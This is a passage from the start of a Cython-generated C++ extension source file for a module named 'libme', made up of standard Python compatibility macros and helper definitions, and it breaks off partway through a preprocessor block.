/* Generated by Cython 0.29.24 */

#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif /* PY_SSIZE_T_CLEAN */
#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.6+ or Python 3.3+.
#else
#define CYTHON_ABI "0_29_24"
#define CYTHON_HEX_VERSION 0x001D18F0
#define CYTHON_FUTURE_DIVISION 0
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #if PY_VERSION_HEX >= 0x02070000
    #define HAVE_LONG_LONG
  #endif
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#ifdef PYPY_VERSION
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#elif defined(PYSTON_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 0
  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 0
  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #ifndef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL 1
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)
  #endif
  #ifndef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)
  #endif
  #ifndef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #include "longintrepr.h"
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
           typedef unsigned char     uint8_t;
           typedef unsigned int      uint32_t;
        #else
           typedef unsigned __int8   uint8_t;
           typedef unsigned __int32  uint32_t;
        #endif
    #endif
#else
   #include <stdint.h>
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus) && __cplusplus >= 201103L
    #if __has_cpp_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH [[fallthrough]]
    #elif __has_cpp_attribute(clang::fallthrough)
      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
    #elif __has_cpp_attribute(gnu::fallthrough)
      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__ ) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif

#ifndef __cplusplus
  #error "Cython files generated with the C++ option must be compiled with a C++ compiler."
#endif
#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #else
    #define CYTHON_INLINE inline
  #endif
#endif
template<typename T>
void __Pyx_call_destructor(T& x) {
    x.~T();
}
template<typename T>
class __Pyx_FakeReference {
  public:
    __Pyx_FakeReference() : ptr(NULL) { }
    __Pyx_FakeReference(const T& ref) : ptr(const_cast<T*>(&ref)) { }
    T *operator->() { return ptr; }
    T *operator&() { return ptr; }
    operator T&() { return *ptr; }
    template<typename U> bool operator ==(U other) { return *ptr == other; }
    template<typename U> bool operator !=(U other) { return *ptr != other; }
  private:
    T *ptr;
};

#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)
  #define Py_OptimizeFlag 0
#endif
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
  #define __Pyx_DefaultClassType PyClass_Type
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
#if PY_VERSION_HEX >= 0x030800A4 && PY_VERSION_HEX < 0x030800B2
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, 0, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#else
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
  #define __Pyx_DefaultClassType PyType_Type
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #define __Pyx_PyCFunctionFast _PyCFunctionFast
  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_FAST_PYCCALL
#define __Pyx_PyFastCFunction_Check(func)\
    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))
#else
#define __Pyx_PyFastCFunction_Check(func) 0
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1
  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)
  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)
  #define PyMem_RawFree(p)             PyMem_Free(p)
#endif
#if CYTHON_COMPILING_IN_PYSTON
  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
#else
#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)
#endif
#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if defined(PyUnicode_IS_READY)
  #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                              0 : _PyUnicode_Ready((PyObject *)(op)))
  #else
  #define __Pyx_PyUnicode_READY(op)       (0)
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)
  #if defined(PyUnicode_IS_READY) && defined(PyUnicode_GET_SIZE)
  #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
  #else
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
  #endif
  #else
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)
  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)
  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)
  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)
  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   PyInt_AsLong
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   PyInt_AsSsize_t
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))
#else
  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(WIN32) || defined(MS_WINDOWS)
  #define _USE_MATH_DEFINES
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifndef __PYX_EXTERN_C
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__libme
#define __PYX_HAVE_API__libme
/* Early includes */
#ifdef _OPENMP
#include <omp.h>
#endif /* _OPENMP */

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
